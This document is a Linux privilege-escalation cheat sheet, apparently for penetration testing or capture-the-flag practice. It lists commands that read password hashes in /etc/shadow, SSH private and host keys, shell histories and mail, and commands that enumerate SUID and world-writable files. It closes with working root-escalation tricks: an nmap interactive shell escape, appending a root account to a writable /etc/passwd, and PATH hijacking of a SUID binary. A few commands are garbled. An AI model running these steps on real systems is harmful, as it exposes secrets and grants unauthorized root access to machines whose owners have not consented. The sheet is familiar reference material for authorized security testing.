# Reuseful escalation patterns

## Shell

Upgrade to bash:

    python -c 'import pty; pty.spawn("/bin/bash")'

## Host Information

Get OS version, patches, etc.:

    /bin/uname -a
    /usr/bin/lsb_release -a
    /bin/cat /etc/*-release

## User Information

Get current user:

    /usr/bin/whoami
    /usr/bin/id

Get user command history:

    /bin/cat /home/$(whoami)/.bash_history
    /bin/cat /home/$(whoami)/.nano_history
    /bin/cat /home/$(whoami)/.vim_history
    /bin/cat /home/$(whoami)/.atftp_history
    /bin/cat /home/$(whoami)/.mysql_history
    /bin/cat /home/$(whoami)/.php_history

Get environment variables and PATH:

    set
    /bin/echo $PATH

Reset $PATH and environment variables:

    set -a
    source /etc/environment
    . ~/
    set +a

List users:

    /bin/cat /etc/passwd
    /bin/cat /etc/group
    /bin/cat /etc/sudoers

Attempt to list hashed passwords:

    /bin/cat /etc/shadow

Current logon and last logon:

    /usr/bin/w
    /usr/bin/last

SSH information:

    cat ~/.ssh/authorized_keys
    cat ~/.ssh/identity.pub
    cat ~/.ssh/identity
    cat ~/.ssh/id_rsa.pub
    cat ~/.ssh/id_rsa
    cat ~/.ssh/id_dsa.pub
    cat ~/.ssh/id_dsa
    cat /etc/ssh/ssh_config
    cat /etc/ssh/sshd_config
    cat /etc/ssh/ssh_host_dsa_key.pub
    cat /etc/ssh/ssh_host_dsa_key
    cat /etc/ssh/ssh_host_rsa_key.pub
    cat /etc/ssh/ssh_host_rsa_key
    cat /etc/ssh/ssh_host_key.pub
    cat /etc/ssh/ssh_host_key

## Services

Current processes:

    /bin/ps -ef | /bin/grep root
    /bin/ps -ef | /bin/grep $(whoami)
    /bin/netstat -at
    /bin/netstat -atnl
    /bin/ss

## Tasks

List cron jobs:

    /usr/bin/crontab -l
    /bin/ls -alh /var/spool/cron
    /bin/ls -al /etc/ | grep cron
    /bin/ls -al /etc/cron*
    /bin/cat /etc/cron*
    /bin/cat /etc/at.allow
    /bin/cat /etc/at.deny
    /bin/cat /etc/cron.allow
    /bin/cat /etc/cron.deny

## Network

List network configuration:

    /sbin/ifconfig
    /sbin/iwconfig
    /sbin/ip a
    /bin/cat /etc/network/interfaces
    /bin/cat /etc/sysconfig/network
    /bin/cat /etc/resolv.conf
    /bin/cat /etc/sysconfig/network
    /bin/cat /etc/networks
    /sbin/ifconfig -aiptables -L
    /bin/hostname
    /bin/dnsdomainname

## Programs and Binaries

Search for installed programs or binaries:

    /bin/ls -lha /bin
    /bin/ls -lha /usr/bin
    /bin/ls -lha /opt/
    /bin/ls -lha /sbin/
    /bin/ls -lha /var/cache/apt/archivesO
    /bin/ls -lha /var/cache/yum/*
    dpkg -l
    rpm -qa

## Weak Permissions

SUID/SGID, RWX, Current User:

    /usr/bin/find / -type f -perm 0777 2>/dev/null
    /usr/bin/find / -user $(whoami) 2>/dev/null
    /bin/ls -ahlR /home/ 
    /bin/ls -ahlR /root/ 

Files from specific group:

    find / -group <group> 2>/dev/null

Find writable files (newer systems):

    /usr/bin/find / -perm /6000 2> /dev/null
    /usr/bin/find / -perm /4000 2> /dev/null
    /usr/bin/find / -perm -g=s -o -perm /4000 ! -type l -maxdepth 3 -exec /bin/ls -ld {} \; 2>/dev/null
    /usr/bin/find / -perm /222 -type d 2>/dev/null

Find writable files (older systems):

    /usr/bin/find / -perm +6000 2> /dev/null
    /usr/bin/find / -perm +4000 2> /dev/null
    /usr/bin/find / -perm -g=s -o -perm +4000 ! -type l -maxdepth 3 -exec /bin/ls -ld {} \; 2>/dev/null
    /usr/bin/find / -perm -222 -type d 2>/dev/null

## Sudo Permissions

Attempt sudo:

    /usr/bin/sudo su -

See if anything can run with sudo:

    /usr/bin/sudo -l

## Mail

Find mail files:

    /bin/cat /var/mail/root
    /bin/cat /var/mail/${whoami}
    /bin/cat /var/spool/mail/root
    /bin/cat /var/spool/mail/${whoami}

## File System

Mounted drives:

    /bin/df -lh
    /bin/cat /etc/fstab
    /bin/mount | column -t

## Files

Search for potentially sensitive files:

    /usr/bin/find / -type f -name "*.txt" 2> /dev/null
    /usr/bin/find / -type f -name "*.log" 2> /dev/null
    /usr/bin/find / -type f -name "*.sh" 2> /dev/null
    /usr/bin/find / -type f -name "*.rar" 2> /dev/null
    /usr/bin/find / -type f -name "*.zip" 2> /dev/null
    /usr/bin/find / -type f -name "*.tar" 2> /dev/null
    /usr/bin/find / -type f -name "*.gz" 2> /dev/null
    /usr/bin/find / -type f -name "*.pdf" 2> /dev/null
    /usr/bin/find / -type f -name "*.xls" 2> /dev/null
    /usr/bin/find / -type f -name "*.xlsx" 2> /dev/null
    /usr/bin/find / -type f -name "*.xml" 2> /dev/null
    /usr/bin/find / -type f -name "*server.xml" 2> /dev/null
    /usr/bin/find / -name *name* 2> /dev/null
    /usr/bin/find / -type f -iname ".*" -ls 2> /dev/null
    /usr/bin/find -maxdepth 2 -type f -ls -exec file -b {} \;

## Elevations

If the user can sudo with nmap:

    sudo nmap --interactive

Then escape:

    !sh

If `/etc/passwd` is writable:

    openssl passwd -1 -salt <user> <password>

Then run above output with:

    echo "<user>:<output>:0:0:root:/root:/bin/bash" >> /etc/passwd

If a `SUID` file has relative instead of absolute path (example if binary backup runs `cat /etc/shadow` then make a 
file called `cat`:

    echo "<exploit-code" > cat
    chmod +x cat

Then update PATH and run:

    export PATH=~/:$PATH
    ./backup